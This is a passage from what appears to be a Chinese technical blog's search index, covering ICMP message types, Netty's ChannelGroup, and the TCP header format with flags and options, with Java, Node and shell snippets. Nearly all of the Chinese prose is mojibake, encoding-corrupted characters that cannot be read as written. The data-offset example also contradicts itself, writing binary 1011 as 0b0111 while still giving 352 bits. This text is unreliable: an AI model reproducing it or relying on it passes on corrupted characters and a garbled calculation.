language_">console</span>.<span class="title function_">log</span>(<span class="title function_">parseIP</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;4500004000004000400635c70a0001022f5eca91&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>)));</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹è·¯ç”±è¡¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -nr</span><br></pre></td></tr></table></figure><h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><p>ICMPï¼ˆInternet Control Message Protocolï¼‰å®ƒæ˜¯TCP&#x2F;IPåè®®æ—çš„ä¸€ä¸ªå­åè®®ï¼Œç”¨äºåœ¨IPä¸»æœºã€è·¯ç”±å™¨ä¹‹é—´ä¼ é€’æ§åˆ¶æ¶ˆæ¯ã€‚æ§åˆ¶æ¶ˆæ¯æ˜¯æŒ‡ç½‘ç»œé€šä¸é€šã€ä¸»æœºæ˜¯å¦å¯è¾¾ã€è·¯ç”±æ˜¯å¦å¯ç”¨ç­‰ç½‘ç»œæœ¬èº«çš„æ¶ˆæ¯ã€‚è¿™äº›æ§åˆ¶æ¶ˆæ¯è™½ç„¶å¹¶ä¸ä¼ è¾“ç”¨æˆ·æ•°æ®ï¼Œä½†æ˜¯å¯¹äºç”¨æˆ·æ•°æ®çš„ä¼ é€’èµ·ç€é‡è¦çš„ä½œç”¨ã€‚</p><table><thead><tr><th>æ¶ˆæ¯</th><th>ç±»å‹</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>Echo reply</td><td>0</td><td>å“åº” Echo æ¶ˆæ¯</td></tr><tr><td>Destination unreachable</td><td>3</td><td>å‡ºäºæŸäº›åŸå› åŒ…æ²¡æœ‰åˆ°è¾¾ç›®çš„åœ°è€Œæ˜¯è¢«ä¸¢å¼ƒï¼Œåˆ™é€šè¿‡æ­¤æ¶ˆæ¯é€šçŸ¥å‘é€æ–¹ã€‚å¯èƒ½çš„åŸå› åŒ…æ‹¬ç›®æ ‡ IP åœ°å€åœ¨è·¯ç”±è¡¨ä¸­ä¸å­˜åœ¨ï¼›ç›®æ ‡ç«¯å£å·ä¸å­˜åœ¨å¯¹åº”çš„å¥—æ¥å­—ï¼›éœ€è¦åˆ†ç‰‡ï¼Œä½†åˆ†ç‰‡è¢«ç¦ç”¨</td></tr><tr><td>Source quench</td><td>4</td><td>å½“å‘é€çš„åŒ…æ•°é‡è¶…è¿‡è·¯ç”±å™¨çš„è½¬å‘èƒ½åŠ›æ—¶ï¼Œè¶…è¿‡çš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒï¼Œè¿™æ—¶ä¼šé€šè¿‡è¿™ä¸€æ¶ˆæ¯é€šçŸ¥å‘é€æ–¹ã€‚ä½†æ˜¯ï¼Œå¹¶ä¸æ˜¯è¯´é‡åˆ°è¿™ç§æƒ…å†µä¸€å®šä¼šå‘é€è¿™ä¸€æ¶ˆæ¯ã€‚å½“è·¯ç”±å™¨çš„æ€§èƒ½ä¸è¶³æ—¶ï¼Œå¯èƒ½è¿è¿™æ¡æ¶ˆæ¯éƒ½ä¸å‘é€ï¼Œå°±ç›´æ¥æŠŠå¤šä½™çš„åŒ…ä¸¢å¼ƒäº†ã€‚å½“å‘é€æ–¹æ”¶åˆ°è¿™æ¡æ¶ˆæ¯æ—¶ï¼Œå¿…é¡»é™ä½å‘é€é€Ÿç‡</td></tr><tr><td>Redirect</td><td>5</td><td>å½“æŸ¥è¯¢è·¯ç”±è¡¨ååˆ¤æ–­è¯¥åŒ…çš„å…¥å£å’Œå‡ºå£ä¸ºåŒä¸€ä¸ªç½‘ç»œæ¥å£æ—¶ï¼Œåˆ™è¡¨ç¤ºè¿™ä¸ªåŒ…ä¸éœ€è¦è¯¥è·¯ç”±å™¨è½¬å‘ï¼Œå¯ä»¥ç”±å‘é€æ–¹ç›´æ¥å‘é€ç»™ä¸‹ä¸€ä¸ªè·¯ç”±å™¨ã€‚é‡åˆ°è¿™ç§æƒ…å†µæ—¶ï¼Œè·¯ç”±å™¨ä¼šå‘é€è¿™æ¡æ¶ˆæ¯ï¼Œç»™å‡ºä¸‹ä¸€ä¸ªè·¯ç”±å™¨çš„ IP åœ°å€ï¼ŒæŒ‡ç¤ºå‘é€æ–¹ç›´æ¥å‘é€è¿‡å»</td></tr><tr><td>Echo</td><td>8</td><td><strong>ping</strong> å‘½ä»¤å‘é€çš„æ¶ˆæ¯ã€‚æ”¶åˆ°è¿™æ¡æ¶ˆæ¯çš„è®¾å¤‡éœ€è¿”å›ä¸€ä¸ª <code>Echo reply</code> æ¶ˆæ¯ï¼Œä»¥ä¾¿ç¡®è®¤é€šä¿¡å¯¹è±¡æ˜¯å¦å­˜åœ¨</td></tr><tr><td>Time exceeded</td><td>11</td><td>ç”±äºè¶…è¿‡äº† IP å¤´éƒ¨ä¸­çš„ TTL å­—æ®µè¡¨ç¤ºçš„å­˜æ´»æ—¶é—´è€Œè¢«è·¯ç”±å™¨ä¸¢å¼ƒï¼Œæ­¤æ—¶è·¯ç”±å™¨ä¼šå‘å‘é€æ–¹å‘é€è¿™æ¡æ¶ˆæ¯</td></tr><tr><td>Parameter problem</td><td>12</td><td>ç”±äº IP å¤´éƒ¨å­—æ®µå­˜åœ¨é”™è¯¯è€Œè¢«ä¸¢å¼ƒï¼Œæ­¤æ—¶ä¼šå‘å‘é€æ–¹å‘é€è¿™æ¡æ¶ˆæ¯</td></tr></tbody></table><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://tools.ietf.org/html/rfc793#section-3.1">TRANSMISSION CONTROL PROTOCOL</a></li><li><a href="https://book.douban.com/subject/26941639/">ç½‘ç»œæ˜¯æ€ä¹ˆè¿æ¥çš„</a></li><li><a href="https://book.douban.com/subject/1088054/">TCP&#x2F;IPè¯¦è§£ å·1ï¼šåè®®</a></li><li><a href="https://book.douban.com/subject/1683696/">TCP&#x2F;IPç½‘ç»œä¸åè®®ï¼ˆç¬¬äºŒç‰ˆï¼‰</a></li><li><a href="https://www.zhihu.com/question/21524257">ä¸ºä»€ä¹ˆæ ‡å‡†ä»¥å¤ªç½‘æ¥å£ç¼ºçœçš„MTUä¸º1500ï¼Ÿ</a></li><li><a href="https://community.emc.com/message/842879#842879">ç»†è¯´TCPç¡®è®¤æœºåˆ¶</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> tcp </tag>
            
            <tag> ip </tag>
            
            <tag> mac </tag>
            
            <tag> arp </tag>
            
            <tag> icmp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netty ChannelGroup</title>
      <link href="/post/netty-channelgroup.html"/>
      <url>/post/netty-channelgroup.html</url>
      
        <content type="html"><![CDATA[<h2 id="ChannelGroup-åˆ†æ"><a href="#ChannelGroup-åˆ†æ" class="headerlink" title="ChannelGroup åˆ†æ"></a>ChannelGroup åˆ†æ</h2><p><code>ChannelGroup</code> ç”¨æ¥ç®¡ç†ä¸€ç»„ <code>Channel</code>ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿çš„å¯¹ä¸€ç»„ <code>Channel</code> åšåŒæ ·çš„æ“ä½œã€‚ä»ç±»å›¾å…³ç³»æ¥çœ‹ï¼Œ<code>ChannelGroup</code>æœ¬è´¨ä¸Šè¿˜æ˜¯ä¸€ä¸ª<code>Set</code>ã€‚</p><p><img src="/images/channelgroup.png" alt="ChannelGroup"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChannelGroup</span> <span class="variable">channels</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultChannelGroup</span>(GlobalEventExecutor.INSTANCE);</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹<a href="https://github.com/netty/netty/blob/4.1/transport/src/main/java/io/netty/channel/group/DefaultChannelGroup.java#L138">DefaultChannelGroup</a>å®ç°ï¼Œæˆ‘ä»¬æ·»åŠ <code>Channel</code>æ—¶éƒ½ä¼šæ³¨å†Œä¸€ä¸ªäº‹ä»¶ï¼Œå½“<code>Channel</code>å…³é—­åä¼šè‡ªåŠ¨æŠŠå®ƒä»<code>ChannelGroup</code>åˆ é™¤æ‰ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦æ­£å¸¸å…³é—­<code>Channel</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ChannelFutureListener</span> <span class="variable">remover</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChannelFutureListener</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">operationComplete</span><span class="params">(ChannelFuture future)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        remove(future.channel());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(Channel channel)</span> &#123;</span><br><span class="line">    ... </span><br><span class="line">    <span class="type">boolean</span> <span class="variable">added</span> <span class="operator">=</span> map.putIfAbsent(channel.id(), channel) == <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (added) &#123;</span><br><span class="line">        channel.closeFuture().addListener(remover);</span><br><span class="line">    &#125;</span><br><span class="line">    ... </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> netty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCPåè®®</title>
      <link href="/post/tcp-protocol.html"/>
      <url>/post/tcp-protocol.html</url>
      
        <content type="html"><![CDATA[<h2 id="TCP-åè®®"><a href="#TCP-åè®®" class="headerlink" title="TCP åè®®"></a>TCP åè®®</h2><p>TRANSMISSION CONTROL PROTOCOL</p><h3 id="ç½‘ç»œåŒ…æ”¶å‘"><a href="#ç½‘ç»œåŒ…æ”¶å‘" class="headerlink" title="ç½‘ç»œåŒ…æ”¶å‘"></a>ç½‘ç»œåŒ…æ”¶å‘</h3><p><img src="/images/tcp-ip-mac.png"></p><p>åŒ…æ”¶å‘æ“ä½œçš„èµ·ç‚¹æ˜¯ TCP æ¨¡å—å§”æ‰˜ IP æ¨¡å—å‘é€åŒ…çš„æ“ä½œã€‚è¿™ä¸ªå§”æ‰˜çš„è¿‡ç¨‹å°±æ˜¯ TCP æ¨¡å—åœ¨æ•°æ®å—çš„å‰é¢åŠ ä¸Š TCP å¤´éƒ¨ï¼Œç„¶åæ•´ä¸ªä¼ é€’ç»™ IP æ¨¡å—ï¼Œè¿™éƒ¨åˆ†å°±æ˜¯ç½‘ç»œåŒ…çš„å†…å®¹ã€‚ä¸æ­¤åŒæ—¶ï¼Œ TCP æ¨¡å—è¿˜éœ€è¦æŒ‡å®šé€šä¿¡å¯¹è±¡çš„ IP åœ°å€ï¼Œä¹Ÿå°±æ˜¯éœ€è¦å†™æ¸…æ¥šâ€œå°†ä»€ä¹ˆå†…å®¹å‘ç»™è°â€ã€‚</p><p>æ”¶åˆ°å§”æ‰˜åï¼ŒIP æ¨¡å—ä¼šå°†åŒ…çš„å†…å®¹å½“ä½œä¸€æ•´å—æ•°æ®ï¼Œåœ¨å‰é¢åŠ ä¸ŠåŒ…å«æ§åˆ¶ä¿¡æ¯çš„ IP å¤´éƒ¨å’Œ MAC å¤´éƒ¨ã€‚IP å¤´éƒ¨ä¸­åŒ…å« IP åè®®è§„å®šçš„ã€æ ¹æ® IP åœ°å€å°†åŒ…å‘å¾€ç›®çš„åœ°æ‰€éœ€çš„æ§åˆ¶ä¿¡æ¯ï¼›MAC å¤´éƒ¨åŒ…å«é€šè¿‡ä»¥å¤ªç½‘çš„å±€åŸŸç½‘å°†åŒ…ä¼ è¾“è‡³æœ€è¿‘çš„è·¯ç”±å™¨æ‰€éœ€çš„æ§åˆ¶ä¿¡æ¯ã€‚</p><p>å°è£…å¥½çš„åŒ…ä¼šä¼ é€’ç»™ç½‘å¡ï¼Œä¼ é€’ç»™ç½‘å¡çš„ç½‘ç»œåŒ…æ˜¯ç”±ä¸€è¿ä¸² 0 å’Œ 1 ç»„æˆçš„æ•°å­—ä¿¡æ¯ï¼Œç½‘å¡ä¼šå°†è¿™äº›æ•°å­—ä¿¡æ¯è½¬æ¢ä¸ºç”µä¿¡å·æˆ–å…‰ä¿¡å·ï¼Œå¹¶é€šè¿‡ç½‘çº¿ï¼ˆæˆ–å…‰çº¤ï¼‰å‘é€å‡ºå»ï¼Œç„¶åè¿™äº›ä¿¡å·å°±ä¼šåˆ°è¾¾é›†çº¿å™¨ã€è·¯ç”±å™¨ç­‰è½¬å‘è®¾å¤‡ï¼Œå†ç”±è½¬å‘è®¾å¤‡ä¸€æ­¥ä¸€æ­¥åœ°é€è¾¾æ¥æ”¶æ–¹ã€‚</p><h3 id="è¿æ¥-æ”¶å‘-æ–­å¼€"><a href="#è¿æ¥-æ”¶å‘-æ–­å¼€" class="headerlink" title="è¿æ¥-æ”¶å‘-æ–­å¼€"></a>è¿æ¥-æ”¶å‘-æ–­å¼€</h3><ol><li><p>è¿æ¥</p><p> ä»¥å¤ªç½‘çš„ç½‘çº¿éƒ½æ˜¯ä¸€ç›´è¿æ¥çš„çŠ¶æ€ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦æ¥å›æ’æ‹”ç½‘çº¿ï¼Œé‚£ä¹ˆè¿™é‡Œ<code>è¿æ¥</code>åˆ°åº•æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿè¿æ¥å®é™…ä¸Šæ˜¯é€šä¿¡åŒæ–¹äº¤æ¢æ§åˆ¶ä¿¡æ¯ï¼Œåœ¨å¥—æ¥å­—ä¸­è®°å½•è¿™äº›å¿…è¦ä¿¡æ¯å¹¶å‡†å¤‡æ•°æ®æ”¶å‘çš„ä¸€è¿ä¸²æ“ä½œã€‚</p><p> <img src="/images/tcp-connection.png"></p></li><li><p>æ”¶å‘</p></li><li><p>æ–­å¼€</p><p> TCP æ–­å¼€æ˜¯åŒæ–¹åå•†çš„ï¼Œä»»ä½•ä¸€ç«¯éƒ½å¯ä»¥å‘èµ·æ–­å¼€ã€‚å¥—æ¥å­—å¹¶ä¸ä¼šç«‹å³è¢«åˆ é™¤ï¼Œè€Œæ˜¯ä¼šç­‰å¾…ä¸€æ®µæ—¶é—´ä¹‹åå†è¢«åˆ é™¤ã€‚<br> <img src="/images/tcp-close.png"></p><blockquote><p>æ–­å¼€éœ€è¦åŒæ–¹å„è‡ªå‘èµ·å¹¶ç¡®è®¤ï¼Œå…±å››æ­¥æ“ä½œã€‚æœ‰äº›æƒ…å†µä¸‹ä¸‰æ­¥ä¹Ÿèƒ½å®Œæˆï¼Œç¬¬2ã€3æ­¥åˆå¹¶åå’Œå››æ­¥æ“ä½œçš„æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚</p></blockquote></li></ol><h3 id="åè®®åˆ†æ"><a href="#åè®®åˆ†æ" class="headerlink" title="åè®®åˆ†æ"></a>åè®®åˆ†æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://css.kekek.cc</span><br></pre></td></tr></table></figure><p>(tcp.dstport &#x3D;&#x3D; 80 and ip.dst &#x3D;&#x3D; 47.94.202.145) or (ip.addr &#x3D;&#x3D; 47.94.202.145 and tcp.port &#x3D;&#x3D; 80)<br><img src="/images/wireshark.png"></p><ol><li>Frame:   ç‰©ç†å±‚çš„æ•°æ®å¸§æ¦‚å†µ</li><li>Ethernet II: æ•°æ®é“¾è·¯å±‚ä»¥å¤ªç½‘å¸§å¤´éƒ¨ä¿¡æ¯</li><li>Internet Protocol Version 4: äº’è”ç½‘å±‚IPåŒ…å¤´éƒ¨ä¿¡æ¯</li><li>Transmission Control Protocol:  ä¼ è¾“å±‚çš„æ•°æ®æ®µå¤´éƒ¨ä¿¡æ¯ï¼Œæ­¤å¤„æ˜¯TCP</li><li>Hypertext Transfer Protocol:  åº”ç”¨å±‚çš„ä¿¡æ¯ï¼Œæ­¤å¤„æ˜¯HTTPåè®®</li></ol><p><a href="https://tools.ietf.org/html/rfc793#section-3.1"> TCP Header Format</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|          Source Port          |       Destination Port        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                        Sequence Number                        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Acknowledgment Number                      |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  Data |           |U|A|P|R|S|F|                               |</span><br><span class="line">| Offset| Reserved  |R|C|S|S|Y|I|            Window             |</span><br><span class="line">|       |           |G|K|H|T|N|N|                               |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|           Checksum            |         Urgent Pointer        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Options                    |    Padding    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                             data                              |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><ul><li><p>Source Port æºç«¯å£å· 16ä½</p></li><li><p>Destination Port ç›®æ ‡ç«¯å£å· 16ä½</p></li><li><p>Sequence Number åºåˆ—å· 32ä½</p><p>  ä»£è¡¨åç§»é‡ï¼Œæœ¬åŒ…åœ¨æ•´ä¸ªä¿¡æ¯ä¸­çš„åç§»é‡ï¼Œä¹Ÿå°±æ˜¯å‘é€çš„æ•°æ®éƒ¨åˆ†ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åºå·ã€‚TCP æ¨¡å—åœ¨æ‹†åˆ†æ•°æ®æ—¶ï¼Œä¼šå…ˆç®—å¥½æ¯ä¸€å—æ•°æ®ç›¸å½“äºä»å¤´å¼€å§‹çš„ç¬¬å‡ ä¸ªå­—èŠ‚ã€‚åœ¨å®é™…çš„é€šä¿¡ä¸­ï¼Œåºå·å¹¶ä¸æ˜¯ä» 1 å¼€å§‹çš„ï¼Œè€Œæ˜¯éœ€è¦ç”¨éšæœºæ•°è®¡ç®—å‡ºä¸€ä¸ªåˆå§‹å€¼ï¼Œåˆå§‹å€¼åœ¨æ¡æ‰‹é˜¶æ®µå‘é€ç»™å¯¹æ–¹ã€‚</p></li><li><p>Acknowledgment Number ç¡®è®¤å· 32ä½ </p><p>  è¡¨ç¤ºæ¥æ”¶æ–¹å¸Œæœ›æ”¶åˆ°å¯¹æ–¹ä¸‹æ¬¡å‘é€çš„æ•°æ®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åºå·ã€‚</p><p>  åœ¨TCPç¡®è®¤æœºåˆ¶ä¸­ï¼Œæ— æ³•æœ‰æ•ˆå¤„ç†éè¿ç»­TCPç‰‡æ®µã€‚ç¡®è®¤å·è¡¨æ˜æ‰€æœ‰ä½äºè¯¥ç¼–å·çš„ Sequence Number å·²ç»è¢«å‘é€è¯¥ç¼–å·çš„è®¾å¤‡æ¥æ”¶ã€‚å¦‚æœæˆ‘ä»¬æ”¶åˆ°çš„å­—èŠ‚æ•°è½åœ¨ä¸¤ä¸ªéè¿ç»­çš„èŒƒå›´å†…ï¼Œåˆ™æ— æ³•åªé€šè¿‡ä¸€ä¸ªç¼–å·æ¥ç¡®è®¤ã€‚è¿™å¯èƒ½å¯¼è‡´æ½œåœ¨ä¸¥é‡çš„æ€§èƒ½é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯é«˜é€Ÿæˆ–å¯é æ€§è¾ƒå·®çš„ç½‘ç»œã€‚</p></li><li><p>Data Offset 4ä½</p><p>  è¡¨ç¤ºæ•°æ®éƒ¨åˆ†çš„èµ·å§‹ä½ç½®ï¼Œä¹Ÿå¯ä»¥è®¤ä¸ºè¡¨ç¤ºå¤´éƒ¨çš„é•¿åº¦ã€‚<code>The number of 32 bit words in the TCP Header.</code> å®ƒçš„åŸºæ•°æ˜¯32 bitï¼ˆå³4ä¸ªå­—èŠ‚ï¼‰ï¼Œä¾‹å¦‚<code>1011</code>è¡¨ç¤ºå¤´éƒ¨å…±<code>0b0111 * 32 = 352 bits</code>(44 bytes)ã€‚å…¶ä¸­ä¸»è¦æ˜¯<code>Options</code>éƒ¨åˆ†ä¸ºå¯å˜é•¿åº¦ã€‚</p></li><li><p>Reserved é¢„ç•™6ä½</p></li><li><p>Control Bits:  æ§åˆ¶ä½ 6 bits (from left to right):</p><ul><li><p>URG:  Urgent Pointer field significant</p><p>  URG ä¸ºç´§æ€¥æ ‡å¿—ï¼Œå’Œç´§æ€¥æŒ‡é’ˆå­—æ®µé…åˆä½¿ç”¨ã€‚å½“ URG ä½ç½®ä¸º1æ—¶ï¼Œè¡¨åæ­¤æŠ¥æ–‡è¦å°½å¿«ä¼ é€ï¼Œè€Œä¸æŒ‰åŸæ’é˜Ÿæ¬¡åºå‘é€ã€‚</p></li><li><p>ACK:  Acknowledgment field significant</p><p>  ç¡®è®¤æ ‡å¿—ï¼Œå’Œ Acknowledgment Number é…åˆä½¿ç”¨ã€‚</p></li><li><p>PSH:  Push Function</p><p>  PSH ä¸ºæ¨é€æ ‡å¿—ï¼Œå½“ PSH ä½ç½®ä¸º1æ—¶ï¼Œå‘é€æ–¹å°†ç«‹å³å‘é€ç¼“å†²åŒºä¸­çš„æ•°æ®ï¼Œè€Œä¸ç­‰å¾…åç»­æ•°æ®æ„æˆä¸€ä¸ªæ›´å¤§çš„æ®µã€‚æ¥æ”¶æ–¹ä¸€æ—¦æ”¶åˆ° PSH ä½ä½1çš„æ®µï¼Œå°±ç«‹å³å°†æ¥æ”¶ç¼“å†²åŒºä¸­çš„æ•°æ®æäº¤ç»™åº”ç”¨ç¨‹åºï¼Œè€Œä¸ç­‰å¾…åç»­æ•°æ®åˆ°è¾¾ã€‚</p></li><li><p>RST:  Reset the connection</p><p>  å¤ä½æ ‡å¿—ã€‚å½“ RST ä½ç½®ä¸º1æ—¶ï¼Œè¡¨åæœ‰ä¸¥é‡å·®é”™ï¼Œå¿…é¡»é‡Šæ”¾è¿æ¥ã€‚</p></li><li><p>SYN:  Synchronize sequence numbers</p><p>  åŒæ­¥æ ‡å¿—ã€‚å½“ SYN ä¸º1æ˜¯è¡¨ç¤ºè¯·æ±‚å»ºç«‹è¿æ¥ï¼Œæ­¤æ—¶ä¼šå‘é€åˆå§‹ Sequence Numberã€‚</p></li><li><p>FIN:  No more data from sender</p><p>  ç»ˆæ­¢æ ‡å¿—ã€‚å½“ FIN ä½ç½®ä¸º1æ—¶ï¼Œè¡¨æ˜æ˜¯æŠ¤å…·å·²ç»å‘é€å®Œï¼Œè¯·æ±‚é‡Šæ”¾è¿æ¥ã€‚</p></li></ul></li><li><p>Window çª—å£ 16ä½</p><p>  æ¥æ”¶æ–¹å‘ŠçŸ¥å‘é€æ–¹çª—å£å¤§å°ï¼ˆå³æ— éœ€ç­‰å¾…ç¡®è®¤å¯ä¸€èµ·å‘é€çš„æ•°æ®é‡ï¼‰ï¼Œç”¨äºé€šçŸ¥å¯¹æ–¹å½“å‰æœºå™¨æ¥æ”¶åŒºçš„å¤§å°ã€‚æé«˜æ•ˆç‡çš„ä¸€ç§æ–¹å¼ï¼Œä¸ç”¨æ¯æ¬¡å‘åŒ…éƒ½è¦<code>ack</code>ä¸€ä¸‹ï¼Œå¯ä»¥å‘å¤šä¸ªåŒ…åä¸€æ¬¡<code>ack</code>ã€‚</p></li><li><p>Checksum æ ¡éªŒå’Œ 16ä½</p><p>  ç”¨æ¥æ£€æŸ¥æ˜¯å¦å‡ºç°é”™è¯¯</p></li><li><p>Urgent Pointer ç´§æ€¥æŒ‡é’ˆ 16ä½</p><p>  è¡¨ç¤ºåº”ç´§æ€¥å¤„ç†çš„æ•°æ®ä½ç½®</p></li><li><p>Options å¯é€‰å­—æ®µ</p><p>  é™¤äº†ä¸Šé¢çš„å›ºå®šå¤´éƒ¨å­—æ®µä¹‹å¤–ï¼Œè¿˜å¯ä»¥æ·»åŠ å¯é€‰å­—æ®µï¼Œä½†é™¤äº†è¿æ¥æ“ä½œä¹‹å¤–ï¼Œå¾ˆå°‘ä½¿ç”¨å¯é€‰å­—æ®µã€‚</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   kid       len          </span><br><span class="line">+--------+</span><br><span class="line">|00000000|</span><br><span class="line">+--------+</span><br><span class="line">|00000001|</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|00000010|00000100|   max seg size  |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|00000011|00000011| wscale |</span><br><span class="line">+--------+--------+--------+</span><br><span class="line">|00000100|00000010|</span><br><span class="line">+--------+--------+</span><br></pre></td></tr></table></figure><ul><li><p>0ï¼šé€‰é¡¹è¡¨ç»“æŸï¼ˆ1å­—èŠ‚ï¼‰</p></li><li><p>1ï¼šæ— æ“ä½œï¼ˆ1å­—èŠ‚ï¼‰ç”¨äºé€‰é¡¹å­—æ®µä¹‹é—´çš„å­—è¾¹ç•Œå¯¹é½ã€‚</p></li><li><p>2ï¼šæœ€å¤§æŠ¥æ–‡æ®µé•¿åº¦ï¼ˆ4å­—èŠ‚ï¼ŒMaximum Segment Sizeï¼ŒMSSï¼‰é€šå¸¸åœ¨å»ºç«‹è¿æ¥è€Œè®¾ç½®SYNæ ‡å¿—çš„æ•°æ®åŒ…ä¸­æŒ‡æ˜è¿™ä¸ªé€‰é¡¹ï¼ŒæŒ‡æ˜æœ¬ç«¯æ‰€èƒ½æ¥æ”¶çš„æœ€å¤§é•¿åº¦çš„æŠ¥æ–‡æ®µã€‚é€šå¸¸å°†MSSè®¾ç½®ä¸ºï¼ˆMTU-40ï¼‰å­—èŠ‚ï¼Œæºå¸¦TCPæŠ¥æ–‡æ®µçš„IPæ•°æ®æŠ¥çš„é•¿åº¦å°±ä¸ä¼šè¶…è¿‡MTUï¼Œä»è€Œé¿å…æœ¬æœºå‘ç”ŸIPåˆ†ç‰‡ã€‚åªèƒ½å‡ºç°åœ¨åŒæ­¥æŠ¥æ–‡æ®µä¸­ï¼Œå¦åˆ™å°†è¢«å¿½ç•¥ã€‚</p></li><li><p>3ï¼šçª—å£æ‰©å¤§å› å­ï¼ˆ4å­—èŠ‚ï¼Œwscaleï¼‰ï¼Œå–å€¼0-14ã€‚ç”¨æ¥æŠŠTCPçš„çª—å£çš„å€¼å·¦ç§»çš„ä½æ•°ï¼Œä½¿çª—å£å€¼ä¹˜å€ã€‚åªèƒ½å‡ºç°åœ¨åŒæ­¥æŠ¥æ–‡æ®µä¸­ï¼Œå¦åˆ™å°†è¢«å¿½ç•¥ã€‚è¿™æ˜¯å› 